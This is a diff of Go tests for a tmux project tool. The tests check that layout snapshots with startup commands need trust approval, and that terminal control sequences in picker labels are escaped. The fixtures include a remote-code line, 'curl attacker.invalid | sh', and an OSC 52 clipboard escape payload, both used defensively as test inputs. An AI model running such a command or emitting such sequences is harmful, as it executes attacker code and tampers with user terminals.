@@ -1388,8 +1388,138 @@ func TestSwitchProjectOpenNamedSnapshotSelectionRestoresAndOpens(t *testing.T) {
 	if got, want := executor.openSessionName, "workspace"; got != want {
 		t.Fatalf("open session = %q, want %q", got, want)
 	}
-	if got, want := executor.calls, []string{"authorize:" + project, "restore:workspace:" + wantSource, "open:workspace"}; !equalStrings(got, want) {
+	if got, want := executor.calls, []string{
+		"authorize:" + project,
+		"authorize-layout:.projmux/layouts/team.toml",
+		"restore:workspace:" + wantSource,
+		"open:workspace",
+	}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
+	}
+}
+
+func TestSwitchProjectOpenNamedSnapshotLayoutDenyStopsBeforeTmuxMutation(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("curl attacker.invalid | sh"))
+	executor.layoutAuthorizeSet = true
+	executor.layoutAuthorizeResult = false
+
+	err := cmd.openProjectTarget(context.Background(), project, "workspace")
+	if !errors.Is(err, errProjectTrustDenied) {
+		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
+	}
+	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
+}
+
+func TestSwitchProjectOpenNamedSnapshotLayoutAuthorizationErrorStopsBeforeTmuxMutation(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("make watch"))
+	executor.layoutAuthorizeErr = errors.New("trust popup failed")
+
+	err := cmd.openProjectTarget(context.Background(), project, "workspace")
+	var trustErr errProjectTrustGate
+	if !errors.As(err, &trustErr) || !strings.Contains(err.Error(), "trust popup failed") {
+		t.Fatalf("openProjectTarget() error = %v, want trust gate error", err)
+	}
+	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
+}
+
+func TestSwitchProjectOpenCommandlessNamedSnapshotSkipsLayoutTrust(t *testing.T) {
+	t.Parallel()
+
+	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.ShellRecipe())
+	executor.layoutAuthorizeSet = true
+	executor.layoutAuthorizeResult = false
+
+	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
+		t.Fatalf("openProjectTarget() error = %v", err)
+	}
+	if executor.layoutAuthorizeCalled {
+		t.Fatal("commandless named snapshot requested executable trust")
+	}
+	if executor.restoreSessionName != "workspace" || executor.openSessionName != "workspace" {
+		t.Fatalf("commandless restore did not preserve behavior: %#v", executor)
+	}
+}
+
+func TestProjectStartupPickerEscapesProjectOwnedLayoutStrings(t *testing.T) {
+	t.Parallel()
+
+	candidate := projectStartupCandidate{
+		Kind:  projectStartupKindNamed,
+		Name:  "team\x1b]52;c;secret\a",
+		Label: "Named snapshot",
+		Description: namedSnapshotDescription(corelayout.Entry{
+			Name:        "team\x1b[31m",
+			Description: "desc\u009b31m\u009dclipboard",
+			Windows:     1,
+			Panes:       1,
+		}),
+	}
+	options := projectStartupPickerOptions([]projectStartupCandidate{candidate})
+	entry := options.Entries[0]
+	for _, rendered := range []string{entry.Label, entry.SearchKey} {
+		plain := stripAnsi(rendered)
+		if strings.Contains(plain, "\x1b") || strings.Contains(plain, "\a") ||
+			strings.Contains(plain, "\u009b") || strings.Contains(plain, "\u009d") {
+			t.Fatalf("picker rendered project control sequence: %q", rendered)
+		}
+	}
+	if !strings.Contains(entry.Label, `\x1b`) || !strings.Contains(entry.SearchKey, `\x1b`) {
+		t.Fatalf("picker did not visibly escape controls: %#v", entry)
+	}
+}
+
+func namedSnapshotTrustTestCommand(t *testing.T, recipe sessionstate.Recipe) (*switchCommand, *capturingSwitchSessionExecutor, string) {
+	t.Helper()
+	home := t.TempDir()
+	enableSidebarStartupPickerForTest(t, home)
+	project := filepath.Join(home, "workspace")
+	if err := corelayout.NewStore(project).Save("team", corelayout.Preset{
+		SchemaVersion: corelayout.SchemaVersion,
+		Windows: []corelayout.Window{{
+			Index:           0,
+			ActivePaneIndex: 0,
+			Panes: []corelayout.Pane{{
+				Index:  0,
+				CWD:    "${PROJMUX_CWD}",
+				Recipe: recipe,
+			}},
+		}},
+	}); err != nil {
+		t.Fatal(err)
+	}
+	executor := &capturingSwitchSessionExecutor{}
+	runner, native := scriptedPicker(t, []pickerStep{{
+		reply: intpickercompat.Result{Value: projectStartupValueNamed + "team"},
+	}})
+	return &switchCommand{
+		sessions: executor,
+		identity: stubSwitchIdentityResolver{name: "workspace"},
+		homeDir:  func() (string, error) { return home, nil },
+		lookupEnv: func(name string) string {
+			if name == "XDG_CONFIG_HOME" {
+				return filepath.Join(home, "config")
+			}
+			return ""
+		},
+		runner:       runner,
+		nativePicker: native,
+	}, executor, project
+}
+
+func assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t *testing.T, executor *capturingSwitchSessionExecutor, project string) {
+	t.Helper()
+	if got, want := executor.calls, []string{
+		"authorize:" + project,
+		"authorize-layout:.projmux/layouts/team.toml",
+	}; !equalStrings(got, want) {
+		t.Fatalf("calls = %q, want %q; no restore/new-session/split/send-keys/open is allowed", got, want)
+	}
+	if executor.restoreSessionName != "" || executor.ensureSessionName != "" || executor.openSessionName != "" {
+		t.Fatalf("trust failure left partial session state: %#v", executor)
 	}
 }
 
@@ -3286,28 +3416,32 @@ func (f pickerRunnerFunc) Run(options intpicker.Options) (intpicker.Result, erro
 }
 
 type capturingSwitchSessionExecutor struct {
-	ensureSessionName  string
-	ensureCWD          string
-	openSessionName    string
-	killSessionName    string
-	restoreSessionName string
-	restoreCWD         string
-	restoreSource      string
-	restoreSnapshot    sessionstate.Snapshot
-	authorizeCalled    bool
-	authorizeResult    bool
-	authorizeSet       bool
-	exists             map[string]bool
-	recentSessions     []string
-	calls              []string
-	killHook           func(string)
-	ensureErr          error
-	openErr            error
-	killErr            error
-	restoreErr         error
-	authorizeErr       error
-	existsErr          error
-	recentErr          error
+	ensureSessionName     string
+	ensureCWD             string
+	openSessionName       string
+	killSessionName       string
+	restoreSessionName    string
+	restoreCWD            string
+	restoreSource         string
+	restoreSnapshot       sessionstate.Snapshot
+	authorizeCalled       bool
+	authorizeResult       bool
+	authorizeSet          bool
+	layoutAuthorizeCalled bool
+	layoutAuthorizeResult bool
+	layoutAuthorizeSet    bool
+	exists                map[string]bool
+	recentSessions        []string
+	calls                 []string
+	killHook              func(string)
+	ensureErr             error
+	openErr               error
+	killErr               error
+	restoreErr            error
+	authorizeErr          error
+	layoutAuthorizeErr    error
+	existsErr             error
+	recentErr             error
 }
 
 type bulkSwitchSessionExecutor struct {
@@ -3372,6 +3506,19 @@ func (e *sidebarOpenTrustPopupExecutor) AuthorizeProjectHooks(_ context.Context,
 	return decision != hooks.ProjectHookDeny, nil
 }
 
+func (e *sidebarOpenTrustPopupExecutor) AuthorizeProjectLayout(_ context.Context, cwd string, artifact corelayout.Artifact) (bool, error) {
+	e.calls = append(e.calls, "authorize-layout:"+artifact.RelativePath)
+	prompt := tmuxProjectHookPrompt(e.lookupEnv, e.executable, e.popupRunner)
+	decision := prompt(hooks.ProjectHookPromptRequest{
+		RepoPath:     cwd,
+		RelativePath: artifact.RelativePath,
+		ArtifactKind: "project layout",
+		SHA256:       "abc123",
+		Preview:      strings.Join(artifact.ExecutableCommands(), "\n"),
+	})
+	return decision != hooks.ProjectHookDeny, nil
+}
+
 func (e *capturingSwitchSessionExecutor) EnsureSession(_ context.Context, sessionName, cwd string) error {
 	e.ensureSessionName = sessionName
 	e.ensureCWD = cwd
@@ -3405,6 +3552,18 @@ func (e *capturingSwitchSessionExecutor) AuthorizeProjectHooks(_ context.Context
 	}
 	if e.authorizeSet {
 		return e.authorizeResult, nil
+	}
+	return true, nil
+}
+
+func (e *capturingSwitchSessionExecutor) AuthorizeProjectLayout(_ context.Context, _ string, artifact corelayout.Artifact) (bool, error) {
+	e.layoutAuthorizeCalled = true
+	e.calls = append(e.calls, "authorize-layout:"+artifact.RelativePath)
+	if e.layoutAuthorizeErr != nil {
+		return false, e.layoutAuthorizeErr
+	}
+	if e.layoutAuthorizeSet {
+		return e.layoutAuthorizeResult, nil
 	}
 	return true, nil
 }
